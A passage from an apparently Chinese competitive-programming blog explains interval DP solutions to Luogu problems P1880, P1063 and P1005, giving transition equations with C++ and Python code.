<span class="token operator">&lt;</span> num<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span>                dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+=</span> dp<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>num<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">></span> num<span class="token punctuation">[</span>j <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>                dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+=</span> dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>num<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">></span> num<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>                dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+=</span> dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">%=</span> mod<span class="token punctuation">;</span>            dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">%=</span> mod<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token punctuation">(</span>dp<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>n<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> dp<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>n<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">%</span> mod <span class="token operator">&lt;&lt;</span> <span class="token string">"\n"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h4 id="P1880-石子合并"><a href="#P1880-石子合并" class="headerlink" title="P1880  石子合并"></a><a href="https://www.luogu.com.cn/problem/P1880">P1880  石子合并</a></h4><ul><li>题意：<br>求合并的最大值和最小值</li></ul><ul><li>题解:<br>很经典的问题，考虑使用区间DP，注意是环形石子；<br>$dp[i][j][0]$表示区间$[i,j]$合并的最小的得分。$dp[i][j][1]$表示区间$[i,j]$合并的最大得分。<br>则存在动态转移方程：</li></ul><pre><code>$dp[i][j][0]=min(dp[i][k][0]+dp[k+1][j][0]+prefix[j]-prefix[i-1],dp[i][j][0])$$dp[i][j][1]=max(dp[i][k][1]+dp[k+1][j][1]+prefix[j]-prefix[i-1],dp[i][j][1])$</code></pre><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> dp<span class="token punctuation">[</span><span class="token number">105</span> <span class="token operator">&lt;&lt;</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">105</span> <span class="token operator">&lt;&lt;</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> n<span class="token punctuation">;</span><span class="token keyword">int</span> num<span class="token punctuation">[</span><span class="token number">105</span> <span class="token operator">&lt;&lt;</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">0</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">int</span> prefix<span class="token punctuation">[</span><span class="token number">105</span> <span class="token operator">&lt;&lt;</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">0</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">solve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    cin <span class="token operator">>></span> n<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        cin <span class="token operator">>></span> num<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>        num<span class="token punctuation">[</span>i <span class="token operator">+</span> n<span class="token punctuation">]</span> <span class="token operator">=</span> num<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token punctuation">(</span>n <span class="token operator">&lt;&lt;</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        prefix<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> prefix<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> num<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">2</span> <span class="token operator">*</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;=</span> <span class="token number">2</span> <span class="token operator">*</span> n<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span>            dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> inf<span class="token punctuation">;</span>        dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> len <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> len <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> len<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">+</span> len <span class="token operator">&lt;=</span> <span class="token number">2</span> <span class="token operator">*</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">int</span> j <span class="token operator">=</span> i <span class="token operator">+</span> len<span class="token punctuation">,</span> tmp <span class="token operator">=</span> inf<span class="token punctuation">;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> k <span class="token operator">=</span> i<span class="token punctuation">;</span> k <span class="token operator">&lt;</span> j<span class="token punctuation">;</span> k<span class="token operator">++</span><span class="token punctuation">)</span>            <span class="token punctuation">&#123;</span>                tmp <span class="token operator">=</span> <span class="token function">min</span><span class="token punctuation">(</span>dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> dp<span class="token punctuation">[</span>k <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> prefix<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">-</span> prefix<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> tmp<span class="token punctuation">)</span><span class="token punctuation">;</span>                dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">max</span><span class="token punctuation">(</span>dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> dp<span class="token punctuation">[</span>k <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> prefix<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">-</span> prefix<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">min</span><span class="token punctuation">(</span>dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> tmp<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">int</span> maxx <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> minn <span class="token operator">=</span> inf<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        maxx <span class="token operator">=</span> <span class="token function">max</span><span class="token punctuation">(</span>maxx<span class="token punctuation">,</span> dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>i <span class="token operator">+</span> n <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        minn <span class="token operator">=</span> <span class="token function">min</span><span class="token punctuation">(</span>minn<span class="token punctuation">,</span> dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>i <span class="token operator">+</span> n <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    cout <span class="token operator">&lt;&lt;</span> minn <span class="token operator">&lt;&lt;</span> <span class="token string">"\n"</span><span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> maxx <span class="token operator">&lt;&lt;</span> <span class="token string">"\n"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h4 id="P1063-能量项链"><a href="#P1063-能量项链" class="headerlink" title="P1063  能量项链"></a><a href="https://www.luogu.com.cn/problem/P1063">P1063  能量项链</a></h4><ul><li><p>题意：<br>求合并的权值最大的值</p></li><li><p>题解：<br>一眼贪心，但是细想不行。有点像石子合并，考虑区间DP;但是这体面没给数据范围，数组只能往大了开。</p><p>  $dp[i][j]$表示区间i和j所能得到的最大值，那么只需要考虑枚举$[i,j]$之间的值即可，转移方程为:<br>  $dp[i][j]=max(dp[i][j],dp[i][k]+dp[k][j]+num[i]<em>num[k]</em>num[j])$</p></li></ul><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> n<span class="token punctuation">;</span><span class="token keyword">int</span> num<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> dp<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">[</span>maxn<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">0</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">solve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    cin <span class="token operator">>></span> n<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>        cin <span class="token operator">>></span> num<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> num<span class="token punctuation">[</span>i <span class="token operator">+</span> n<span class="token punctuation">]</span> <span class="token operator">=</span> num<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> res <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> len <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span> len <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span> len<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">+</span> len <span class="token operator">&lt;=</span> <span class="token number">2</span> <span class="token operator">*</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">int</span> j <span class="token operator">=</span> i <span class="token operator">+</span> len<span class="token punctuation">;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> k <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span> k <span class="token operator">&lt;</span> j<span class="token punctuation">;</span> k<span class="token operator">++</span><span class="token punctuation">)</span>            <span class="token punctuation">&#123;</span>                dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">max</span><span class="token punctuation">(</span>dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span> dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">+</span> dp<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">+</span> num<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">*</span> num<span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">*</span> num<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>        res <span class="token operator">=</span> <span class="token function">max</span><span class="token punctuation">(</span>res<span class="token punctuation">,</span> dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>i <span class="token operator">+</span> n<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> res <span class="token operator">&lt;&lt;</span> <span class="token string">"\n"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h4 id="P1005-矩阵取数游戏"><a href="#P1005-矩阵取数游戏" class="headerlink" title="P1005  矩阵取数游戏"></a><a href="https://www.luogu.com.cn/problem/P1005">P1005  矩阵取数游戏</a></h4><ul><li><p>题意：<br>求按题意操作的最大取值。</p></li><li><p>题解：<br>考虑区间DP。状态转移方程：$dp[i][j]$表示区间取到区间$[i,j]$的最大取值个数。由于爆long long ，INT_128又不太会用，我选择使用python。</p><p>  $dp[i][j]=max(dp[i][j],dp[i-1][j]+num[i-1]<em>2^{m-j+i-1},dp[i][j+1]+num[j]</em>2^{m-j+i-1})$</p></li></ul><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> n<span class="token punctuation">,</span> m<span class="token punctuation">;</span><span class="token keyword">long</span> <span class="token keyword">long</span> dp<span class="token punctuation">[</span><span class="token number">101</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">101</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">101</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">0</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">long</span> <span class="token keyword">long</span> num<span class="token punctuation">[</span><span class="token number">101</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">101</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">solve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    cin <span class="token operator">>></span> n <span class="token operator">>></span> m<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> j <span class="token operator">&lt;=</span> m<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            cin <span class="token operator">>></span> num<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">long</span> <span class="token keyword">long</span> res <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> l <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> l <span class="token operator">&lt;=</span> m<span class="token punctuation">;</span> l<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> r <span class="token operator">=</span> m<span class="token punctuation">;</span> r <span class="token operator">>=</span> l<span class="token punctuation">;</span> r<span class="token operator">--</span><span class="token punctuation">)</span>            <span class="token punctuation">&#123;</span>                dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>l<span class="token punctuation">]</span><span class="token punctuation">[</span>r<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">max</span><span class="token punctuation">(</span>dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>l<span class="token punctuation">]</span><span class="token punctuation">[</span>r<span class="token punctuation">]</span><span class="token punctuation">,</span> dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>l <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>r<span class="token punctuation">]</span> <span class="token operator">+</span> num<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>l <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">&lt;&lt;</span> <span class="token punctuation">(</span>m <span class="token operator">-</span> r <span class="token operator">+</span> l <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>l<span class="token punctuation">]</span><span class="token punctuation">[</span>r<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">max</span><span class="token punctuation">(</span>dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>l<span class="token punctuation">]</span><span class="token punctuation">[</span>r<span class="token punctuation">]</span><span class="token punctuation">,</span> dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>l<span class="token punctuation">]</span><span class="token punctuation">[</span>r <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> num<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>r <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">&lt;&lt;</span> <span class="token punctuation">(</span>m <span class="token operator">-</span> r <span class="token operator">+</span> l <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">long</span> <span class="token keyword">long</span> tmp <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> k <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> k <span class="token operator">&lt;=</span> m<span class="token punctuation">;</span> k<span class="token operator">++</span><span class="token punctuation">)</span>            tmp <span class="token operator">=</span> <span class="token function">max</span><span class="token punctuation">(</span>tmp<span class="token punctuation">,</span> dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">+</span> num<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">&lt;&lt;</span> m<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        res <span class="token operator">+=</span> tmp<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    cout <span class="token operator">&lt;&lt;</span> res <span class="token operator">&lt;&lt;</span> <span class="token string">"\n"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><pre class="language-python" data-language="python"><code class="language-python">n<span class="token punctuation">,</span> m <span class="token operator">=</span> <span class="token builtin">map</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">,</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>res <span class="token operator">=</span> <span class="token number">0</span>x <span class="token operator">=</span> <span class="token number">2</span>temp <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>m <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    temp<span class="token punctuation">.</span>append<span class="token punctuation">(</span>x<span class="token punctuation">)</span>    x <span class="token operator">=</span> x <span class="token operator">*</span> <span class="token number">2</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>    string <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    nums <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">(</span>each<span class="token punctuation">)</span> <span class="token keyword">for</span> each <span class="token keyword">in</span> string<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">)</span><span class="token punctuation">]</span>    num <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> x <span class="token keyword">in</span> nums<span class="token punctuation">:</span>        num<span class="token punctuation">.</span>append<span class="token punctuation">(</span>x<span class="token punctuation">)</span>    num<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    dp <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">0</span> <span class="token keyword">for</span> every <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>m <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token keyword">for</span> each <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>m <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> l <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> m<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> r <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span> l <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            dp<span class="token punctuation">[</span>l<span class="token punctuation">]</span><span class="token punctuation">[</span>r<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">max</span><span class="token punctuation">(</span>dp<span class="token punctuation">[</span>l<span class="token punctuation">]</span><span class="token punctuation">[</span>r<span class="token punctuation">]</span><span class="token punctuation">,</span>                           dp<span class="token punctuation">[</span>l <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>r<span class="token punctuation">]</span> <span class="token operator">+</span> num<span class="token punctuation">[</span>l <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">&lt;&lt;</span> <span class="token punctuation">(</span>m <span class="token operator">-</span> r <span class="token operator">+</span> l <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            dp<span class="token punctuation">[</span>l<span class="token punctuation">]</span><span class="token punctuation">[</span>r<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">max</span><span class="token punctuation">(</span>dp<span class="token punctuation">[</span>l<span class="token 